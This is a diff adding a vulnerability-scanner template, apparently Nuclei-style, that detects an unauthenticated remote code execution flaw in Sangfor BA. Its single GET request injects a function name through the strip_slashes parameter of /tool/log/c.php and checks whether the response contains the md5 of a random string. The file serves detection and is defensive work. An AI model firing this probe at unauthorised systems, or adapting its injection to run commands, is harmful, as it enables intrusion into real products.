@@ -1,0 +1,25 @@
+id: sangfor-ba-rce
+brief:
+    title: Sangfor BA - Remote Code Execution
+    by: ritikchaddha
+    level: critical
+    about: Sangfor products allow remote unauthenticated users to cause the product to execute arbitrary commands.
+    label:
+        - rce
+        - sangfor
+        - intrusive
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}'
+      signs:
+        - "on": word
+          has:
+            - '{{md5("{{randstr}}")}}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
